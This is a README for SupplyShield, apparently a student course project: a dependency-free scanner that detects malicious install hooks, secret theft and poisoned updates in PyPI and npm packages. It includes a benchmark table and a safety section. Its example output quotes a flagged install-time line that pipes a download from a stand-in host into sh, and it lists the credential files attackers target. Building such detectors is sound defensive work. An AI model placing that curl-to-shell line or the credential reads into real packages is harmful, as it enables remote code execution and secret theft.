# SupplyShield

**Detect malicious behaviour in PyPI and npm packages *before* you install them.**

Every app is built from hundreds of open-source packages, and attackers poison them:
[event-stream](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident) (2018),
[ua-parser-js](https://www.cisa.gov/news-events/alerts/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js) (2021) and the
[XZ Utils backdoor, CVE-2024-3094](https://en.wikipedia.org/wiki/XZ_Utils_backdoor) (2024).

The most widely used free tools (`pip-audit`, `npm audit`, Dependabot) answer one question:
*"Is this package on a list of known vulnerabilities?"* A brand-new malicious package or a freshly
poisoned update is on no list yet, so they report it as clean.

SupplyShield asks a different question: **"What does this package's code actually do?"**

| What SupplyShield checks | Why it matters |
|---|---|
| Code that runs **automatically at install time** (`setup.py` hooks, npm `preinstall`/`postinstall`) | Most malicious packages execute before you ever use them |
| **Hidden payloads**: base64/zlib decoded then `exec`/`eval`, obfuscated identifiers, high-entropy blobs | Hides the real code from reviewers |
| **Secret access**: all environment variables, `~/.ssh`, `~/.aws/credentials`, `.npmrc`, browser stores | API keys and tokens are what attackers want |
| **Network and system commands**: `urllib`/`requests`/`socket`, `https`/`fetch`, `subprocess`/`child_process` | How stolen data leaves and second stages arrive |
| **Typosquatting**: `reqeusts`, `lodahs` (edit distance incl. letter swaps) | A single typo installs malware |
| **Version diff**: behaviour *introduced* by an update, plus newly added dependencies | How event-stream, ua-parser-js and XZ attacks arrived |
| **Attack-chain scoring**: e.g. install-time + secrets + network = data theft | Single signals are common in good code; combinations are not |

Every finding comes with a plain-language **why** and **fix**. SupplyShield never installs, imports or runs
the code it analyses, needs **no dependencies** (Python standard library only), and works offline.

## Install and use

```bash
git clone https://github.com/PahuldeepSinghSodhi/supplyshield.git
cd supplyshield
pip install -e .            # or run without installing: python -m supplyshield ...

supplyshield scan path/to/package            # folder, .tar.gz/.tgz (sdist or npm pack), .whl or .zip
supplyshield scan pkg1 pkg2 --json           # machine-readable
supplyshield diff old-version new-version    # what did this update add?
```

Exit codes: `0` safe, `1` suspicious, `2` malicious, so it can gate a CI pipeline.

To check a package from the registry without installing it, download it first:
`pip download --no-deps --no-binary :all: <name>` or `npm pack <name>`, then scan the archive.

### Example

```
$ supplyshield diff samples/pypi/colorlib-1.0 samples/pypi/colorlib-1.1
Old version 1.0.0: SAFE (0/100)
New version 1.1.0: MALICIOUS (100/100)

Behaviour introduced by update: colorlib 1.0.0 -> 1.1.0 (pypi)
Verdict: [ MALICIOUS ]   Risk score: 100/100   Findings: 3
Attack chains detected:
  >> Install-time command execution: runs system commands during installation

CRITICAL PY-DOWNLOAD-EXEC    setup.py:9  [runs at install, NEW in this version]
         code: os.system('curl -s https://collector.example.invalid/stage2.sh | sh')
         why:  A system command downloads something from the internet and runs it
         immediately (e.g. 'curl ... | sh'). This is how second-stage malware is fetched.
         fix:  Do not install. Nothing in a library should download and run remote scripts.
...
```

## Evaluation

20-package labelled corpus (12 malicious, 8 benign; PyPI and npm), see [`samples/`](samples/).
Reproduce with `python eval/run_eval.py`; full per-sample output in [`eval/results.md`](eval/results.md).

| Tool | Samples covered | Detected | Missed | False alarms | Precision | Recall | Time per package |
|---|---|---|---|---|---|---|---|
| **SupplyShield** | 20 | 10 | 2 | 1 | 0.91 | 0.83 | 6 ms |
| GuardDog 2.10 (Semgrep 1.187) | 20 | 10 | 2 | 1 | 0.91 | 0.83 | 4.2 s |
| Bandit 1.9 (medium/high issues) | 10 (Python only) | 3 | 3 | 0 | 1.00 | 0.50 | 0.25 s |
| pip-audit 2.10 | 10 (Python only) | 0 | 6 | 0 | – | 0.00 | 0.6 s |
| npm audit (npm 11) | 10 (npm only) | 0 | 6 | 0 | – | 0.00 | 1.0 s |

**GuardDog** ties on detection but makes different mistakes. It catches both evasive samples (SupplyShield misses
them), misses both typosquats (its name check needs registry metadata, so local-folder scans skip it), and
false-alarms on a benign `node-gyp` install script. It reports matched rules without severity, so a harmless
native build and a `curl | sh` install script look identical. SupplyShield rates them low and critical, explains
attack chains and version diffs, and is about 700× faster. GuardDog 3.x would not build on Windows, so 2.10.0
(the newest with prebuilt packages for Python 3.13) was used.

Version diff caught both poisoned updates (`colorlib` 1.0→1.1, `minilog-pretty` 1.0.0→1.0.1), including the
new dependency added in the npm one.

**Honest limits.** The corpus is small and self-made, so these numbers show the approach works, not
real-world accuracy. SupplyShield missed both deliberately evasive samples (names assembled at run time) and
raised one false alarm (a legitimate `setup.py` that calls `git`). pip-audit and npm audit are not designed to
find new malware; they find *known vulnerable versions*, which SupplyShield does not. The tools are
complementary. Commercial services such as Socket.dev also analyse behaviour. SupplyShield's distinguishing
features are version-diff analysis, graded attack-chain scoring with explanations, speed, and zero dependencies.

## Project layout

```
supplyshield/   scanner (loader, Python AST rules, npm rules, scoring, diff, report, CLI)
samples/        inert test corpus + generator + ground-truth labels
eval/           comparison script and results
tests/          pytest unit tests
paper/          LNCS article source (Overleaf)
```

## Safety

The test samples imitate real attacks but are inert: network addresses use the reserved `.invalid` domain
and payloads only print a message. Never install them. Use SupplyShield only on code you are allowed to analyse.

## Author

Pahuldeep Singh Sodhi (Roll No. 102306051), Thapar Institute of Engineering and Technology (TIET).
Cybersecurity course project, instructor: Dr. Rohit Ahuja.

## License

MIT
